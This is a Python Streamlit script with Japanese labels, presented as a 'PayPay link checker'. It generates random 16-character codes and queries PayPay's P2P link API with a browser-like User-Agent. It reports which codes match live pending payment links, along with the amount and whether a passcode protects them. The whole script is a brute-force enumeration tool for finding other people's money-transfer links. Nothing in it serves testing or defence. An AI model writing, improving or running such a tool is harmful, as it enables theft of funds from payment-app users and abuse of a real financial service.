import random
import uuid
import time
import requests
import streamlit as st

def rand_gen(n=16):
    """ランダムな16文字の英数字を生成"""
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(random.choice(chars) for _ in range(n))

def check_link(code):
    """PayPayリンクの有効性をチェック"""
    client_uuid = str(uuid.uuid4())
    headers = {
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0"
    }
    url = f"https://www.paypay.ne.jp/app/v2/p2p-api/getP2PLinkInfo?verificationCode={code}&client_uuid={client_uuid}"
    response = requests.get(url, headers=headers)
    
    try:
        data = response.json()
        if data["payload"].get("orderStatus") == "PENDING":
            amount = data["payload"].get("pendingP2PInfo", {}).get("amount", "不明")
            has_passcode = data["payload"].get("pendingP2PInfo", {}).get("isSetPasscode", False)
            return True, amount, has_passcode
    except Exception:
        pass
    return False, None, None

def generate_and_check_links(iterations, num_links, delay_gen, delay_check):
    """指定回数ループして有効なリンクを探す"""
    results = []
    for i in range(iterations):
        generated_links = [rand_gen() for _ in range(num_links)]
        
        for link in generated_links:
            paypay_link = f"https://pay.paypay.ne.jp/{link}"
            is_valid, amount, has_passcode = check_link(link)
            time.sleep(delay_check)
            
            # リアルタイムで結果を表示
            if is_valid:
                st.write(f"✅ 有効なリンク: {paypay_link} | 金額: {amount} | パスワード: {'あり' if has_passcode else 'なし'}")
            else:
                st.write(f"❌ 無効: {paypay_link}")
            
            # 結果をリストにも追加
            results.append((paypay_link, is_valid, amount, has_passcode))
    
    return results

# Streamlit UI
st.title("PayPayリンクチェッカー")
iterations = st.number_input("何回ループしますか？", min_value=1, max_value=100, value=5)
num_links = st.number_input("1回のループで生成するリンク数", min_value=1, max_value=10, value=1)
delay_check = st.slider("チェックの待機時間 (秒)", 0.1, 2.0, 0.4)

if st.button("リンクをチェック"):
    generate_and_check_links(iterations, num_links, 0.2, delay_check)
